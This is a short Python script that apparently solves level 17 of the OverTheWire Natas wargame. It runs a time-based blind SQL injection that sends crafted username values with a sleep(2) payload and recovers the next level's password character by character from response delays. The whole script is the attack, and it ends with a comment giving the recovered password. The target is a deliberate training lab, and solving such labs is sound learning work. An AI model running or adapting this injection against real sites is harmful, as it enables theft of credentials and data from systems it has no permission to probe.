import requests
import string,re
import time



username="natas17"
password="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

url=str("http://%s.natas.labs.overthewire.org/"%username)

look=string.printable
passwd=[]
count=0
vocabulaire=string.digits+string.ascii_uppercase+string.ascii_lowercase
while(True):
    for ele in vocabulaire:
        depart=time.time()
        r = requests.post(url,data={'username':'natas18" AND password LIKE binary "'+''.join(passwd)+ele+'%" AND sleep(2) #'},auth=(username, password))
        # binary for differenciate between upper case and lower case
        final=time.time()
        if (final-depart)>2:
            passwd+=[ele]
            print("goood......",''.join(passwd)+ele)
        else:
            print("waiting......", final-depart,'.....',''.join(passwd) + ele)

    

# the password natas18 : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
